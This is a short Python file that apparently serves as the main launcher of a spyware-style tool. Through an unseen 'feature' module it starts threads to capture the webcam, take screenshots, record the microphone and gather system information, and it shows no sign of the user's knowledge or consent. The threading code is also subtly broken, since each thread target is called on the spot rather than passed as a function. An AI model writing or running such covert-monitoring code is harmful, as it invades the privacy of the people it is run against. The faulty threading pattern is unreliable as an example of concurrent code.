import threading
import feature

class MainFileException(Exception):
    pass

def main():
    webcamera = feature.WEBCAMERA
    screenshots = feature.SCREENSHOTS
    microphone = feature.MICROPHONE
    system_information = feature.SYS_INFO

    try:
        # Create threads for each function
        web_camera_thread = threading.Thread(target=webcamera.webcamera())
        screenshots_thread = threading.Thread(target=screenshots.screenshots())
        microphone_thread = threading.Thread(target=microphone.microphone())
        system_information_thread = threading.Thread(target=system_information.system_information())

        # Start the threads
        web_camera_thread.start()
        screenshots_thread.start()
        microphone_thread.start()
        system_information_thread.start()

        # Wait for all threads to finish
        web_camera_thread.join()
        screenshots_thread.join()
        microphone_thread.join()
        system_information_thread.join()

    except Exception as e:
        raise MainFileException("Main failed to run") from e

if __name__ == '__main__':
    try:
        main()
    except MainFileException as e:
        print(f"Main failed to run: {str(e)}")